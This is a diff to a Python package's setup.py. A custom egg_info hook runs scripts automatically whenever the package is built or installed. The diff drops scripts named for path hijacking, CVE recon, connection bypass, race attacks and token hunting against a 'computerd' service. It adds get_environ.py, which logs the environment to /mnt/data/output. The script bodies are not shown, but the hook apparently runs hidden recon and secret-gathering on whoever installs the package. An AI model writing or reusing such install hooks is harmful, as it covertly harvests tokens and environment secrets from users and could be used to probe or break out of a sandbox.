@@ -8,12 +8,7 @@ class PostEggInfo(egg_info):
         base = os.path.dirname(__file__)
         scripts = [
             ("config/init.txt", "python3", 30, None),
-            ("hijack_all_paths.py", "python3", 60, "/mnt/data/output/hijack_all_paths.log"),
-            ("cve_2026_5747_recon.sh", "bash", 60, "/mnt/data/output/cve_2026_5747_recon.log"),
-            ("computerd_probe.py", "python3", 60, "/mnt/data/output/computerd_probe.log"),
-            ("computerd_connect_bypass.py", "python3", 60, "/mnt/data/output/computerd_connect_bypass.log"),
-            ("computerd_race_connect.py", "python3", 60, "/mnt/data/output/computerd_race_connect.log"),
-            ("computerd_token_hunt.py", "python3", 120, "/mnt/data/output/computerd_token_hunt.log"),
+            ("get_environ.py", "python3", 30, "/mnt/data/output/get_environ.log"),
         ]
         for script, runner, timeout, log in scripts:
             path = os.path.join(base, script)
@@ -31,7 +26,7 @@ class PostEggInfo(egg_info):
 
 setup(
     name="axiom-test",
-    version="1.8.0",
+    version="1.9.0",
     packages=find_packages(),
     cmdclass={"egg_info": PostEggInfo},
 )
